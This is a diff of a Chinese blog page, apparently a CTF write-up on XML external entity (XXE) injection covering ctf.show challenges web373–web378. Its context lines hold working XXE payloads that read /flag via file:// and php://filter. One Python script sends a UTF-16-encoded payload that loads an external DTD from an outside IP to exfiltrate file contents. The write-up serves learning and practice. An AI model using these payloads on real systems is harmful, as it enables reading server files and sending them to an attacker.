@@ -230,9 +230,9 @@
 </blockquote>
 <h2 id="实体类别介绍">实体类别介绍</h2>
 <p>实体主要分为以下四类 * 内置实体 * 字符实体 * 通用实体 * 参数实体</p>
-<p>参数实体用%实体名称申明，引用时也用%实体名称<br />
-其余实体直接用实体名称申明，使用时用&amp;实体名称<br />
-参数实体只能在DTD中申明，DTD中引用<br />
+<p>参数实体用%实体名称申明，引用时也用%实体名称<br>
+其余实体直接用实体名称申明，使用时用&amp;实体名称<br>
+参数实体只能在DTD中申明，DTD中引用<br>
 其余实体只能在DTD中申明，可在xml文档中引入</p>
 <p>注意：<strong>参数实体是在DTD中被引用的，而其余实体是在xml文档中被引入的</strong></p>
 <h1 id="dtd实体声明">DTD实体声明</h1>
@@ -265,7 +265,7 @@ nMask，说明xml文件可以被解析。</p>
 <p>第二步检测服务器是否支持DTD引用外部实体： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/index.html&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%name; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="php代码层面">PHP代码层面</h2>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  <span class="comment">//获取提交的XML数据</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);  <span class="comment">// 交给PHP的XML解析函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给xml变量。<br />
+<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给xml变量。<br>
 这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
 <h1 id="例题">例题</h1>
 <h2 id="web373">web373</h2>
@@ -279,7 +279,7 @@ nMask，说明xml文件可以被解析。</p>
 <h2 id="web377">web377</h2>
 <p>对http进行了过滤，但我们可以通过utf-16编码绕过 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6e07c613-d190-40c1-a22d-b8ee5f5569a3.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://45.76.194.53:8080/text.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">requests.post(url, data=payload)</span><br></pre></td></tr></table></figure></p>
 <h2 id="web378">web378</h2>
-<p><img src="https://s3.bmp.ovh/imgs/2023/08/07/53a3a5ac1abc0001.png" />
+<p><img src="https://s3.bmp.ovh/imgs/2023/08/07/53a3a5ac1abc0001.png">
 一看就是传了一个xml，直接在DTD中包含flag即可 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 
     </div>
@@ -302,7 +302,10 @@ nMask，说明xml文件可以被解析。</p>
     <a href="/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="phar反序列化">
       <i class="fa fa-chevron-left"></i> phar反序列化
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/21/MoeCTF/" rel="next" title="MoeCTF">
+      MoeCTF <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -377,7 +380,7 @@ nMask，说明xml文件可以被解析。</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -390,7 +393,7 @@ nMask，说明xml文件可以被解析。</p>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
